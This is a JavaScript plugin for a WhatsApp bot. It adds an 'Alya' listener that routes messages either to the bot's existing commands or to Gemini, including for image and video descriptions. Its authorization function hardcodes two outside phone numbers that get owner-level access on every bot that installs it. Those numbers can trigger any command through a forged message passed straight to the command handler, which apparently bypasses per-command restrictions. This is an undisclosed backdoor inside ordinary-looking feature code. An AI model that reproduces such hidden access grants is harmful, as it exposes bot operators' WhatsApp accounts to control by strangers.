const { command, isPrivate, getJson } = require("../lib/");
const axios = require("axios");
const fetch = require("node-fetch");
const { downloadMediaMessage } = require("@whiskeysockets/baileys");
const fileType = require("file-type");
const Tesseract = require("tesseract.js");
const config = require("../config");
const { commands } = require("../lib/event");
const hand = config.HANDLERS;
const { encodeFileToBase64, sendToGemini } = require("../lib/aiModule");

if (typeof config.PRIME === "undefined") config.PRIME = true;
let primeListener = config.PRIME;

function extractNumberFromJid(jid) {
  return jid.split("@")[0];
}

function isAuthorized(sender) {
  const allowedNumbers = ["2349123721026", "2348100835767"];
  const senderNumber = extractNumberFromJid(sender);
  return (
    config.OWNER_NUMBER.includes(senderNumber) ||
    (config.SUDO && config.SUDO.includes(senderNumber)) ||
    allowedNumbers.includes(senderNumber)
  );
}

// **Command to toggle Alya ON/OFF**
command(
  {
    pattern: "alya",
    fromMe: true,
    desc: "Turn Alya listener ON or OFF",
    type: "config",
  },
  async (king, match) => {
    if (!match) return await king.reply("Usage: `!alya on` or `!alya off`");

    const action = match.toLowerCase().trim();
    if (action === "on") {
      primeListener = true;
      config.PRIME = true;
      await king.reply("✅ *Alya Listener is now ON ✅*");
    } else if (action === "off") {
      primeListener = false;
      config.PRIME = false;
      await king.reply("❌ *Alya Listener is now OFF ❌*");
    } else {
      await king.reply("Invalid command! Use `!alya on` or `!alya off`.");
    }
  }
);

// **Alya Main Listener**
command(
  {
    on: "text",
  },
  async (king, match, m, conn) => {
    if (!primeListener || !isAuthorized(m.sender)) return;

    const text = m.body.trim();
    if (!text.toLowerCase().startsWith("alya")) return;

    // Extract query after "alya"
    let query = text.replace(/^alya\s*/i, "").trim();

    // If only "alya" is sent, provide a default response
    if (!query) {
      return await king.reply("*Hello! How can I assist you?*");
    }

    // **Command Recognition using your Sticker-based method**
    const pluginss = require("../lib/event");
    const allCommands = await pluginss.commands || commands;

    let targetCommand = null;
    for (const cmd of allCommands) {
      if (!cmd.pattern) continue;

      const patternStr = cmd.pattern.toString().toLowerCase();
      if (patternStr.includes(query.toLowerCase())) {
        targetCommand = cmd;
        break;
      }
    }

    if (targetCommand) {
      console.log("Alya triggered command:", targetCommand.pattern);

      // Create a fake message with the command prefix to trigger the handler properly
      const fakeMessage = { ...m, body: `${hand}${query}` };

      let whats = new (require("../lib/Base").King)(conn, fakeMessage, fakeMessage);
      await targetCommand.function(whats, "", fakeMessage, conn);
      return;
    }

    // **AI Processing (if no command is found)**
    let mediaBase64 = null;
    let mimeType = null;

    if (king.reply_message) {
      if (king.reply_message.text) {
        query = king.reply_message.text;
      } else if (king.reply_message.mimetype) {
        const mediaBuffer = await downloadMediaMessage(king.reply_message, "buffer");
        if (!mediaBuffer) return await king.reply("*_Failed to download media._*");

        const fileSizeMB = mediaBuffer.length / (1024 * 1024);
        if (fileSizeMB > 200) return await king.reply("*_File size exceeds 200MB limit._*");

        mimeType = king.reply_message.mimetype;
        if (mimeType.startsWith("image/") || mimeType.startsWith("video/")) {
          mediaBase64 = await encodeFileToBase64(mediaBuffer);
          query = query || "Describe this media";
        } else {
          return await king.reply("*_Unsupported media format. Use an image or video._*");
        }
      }
    }

    const responseText = await sendToGemini(query, mediaBase64, mimeType);
    await king.reply(responseText);
  }
);